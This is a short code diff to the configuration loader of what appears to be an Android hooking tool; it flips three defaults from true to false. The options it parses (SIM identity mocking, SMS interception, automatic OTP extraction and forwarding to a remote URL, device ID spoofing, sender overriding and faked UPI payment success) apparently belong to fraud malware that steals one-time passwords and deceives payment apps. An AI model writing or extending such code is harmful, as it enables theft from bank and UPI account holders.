@@ -266,9 +266,9 @@ bool ConfigManager::load() {
     config_.mock_imsi_sim2 = parse_string(json, "mock_imsi_sim2", config_.mock_imsi_sim2);
     config_.mock_iccid_sim1 = parse_string(json, "mock_iccid_sim1", config_.mock_iccid_sim1);
     config_.mock_iccid_sim2 = parse_string(json, "mock_iccid_sim2", config_.mock_iccid_sim2);
-    config_.hook_incoming_sms = parse_bool(json, "hook_incoming_sms", true);
+    config_.hook_incoming_sms = parse_bool(json, "hook_incoming_sms", false);
     config_.hook_outgoing_sms = parse_bool(json, "hook_outgoing_sms", true);
-    config_.hook_upi_verification = parse_bool(json, "hook_upi_verification", true);
+    config_.hook_upi_verification = parse_bool(json, "hook_upi_verification", false);
     config_.auto_extract_otp = parse_bool(json, "auto_extract_otp", true);
     config_.auto_forward_token = parse_bool(json, "auto_forward_token", true);
     config_.forward_url = parse_string(json, "forward_url", config_.forward_url);
@@ -307,7 +307,7 @@ bool ConfigManager::load() {
     config_.spoof_android_id = parse_string(json, "spoof_android_id", config_.spoof_android_id);
     config_.upi_timer_bonus_seconds = parse_int(json, "upi_timer_bonus_seconds", 20);
     config_.upi_app_timer_bonuses = parse_int_map(json, "upi_app_timer_bonuses");
-    config_.override_incoming_sender = parse_bool(json, "override_incoming_sender", true);
+    config_.override_incoming_sender = parse_bool(json, "override_incoming_sender", false);
     config_.fake_intercept_telegram = parse_bool(json, "fake_intercept_telegram", true);
     config_.intercept_fake_success = parse_bool(json, "intercept_fake_success", true);
     config_.auto_hook_foreground = parse_bool(json, "auto_hook_foreground", true);
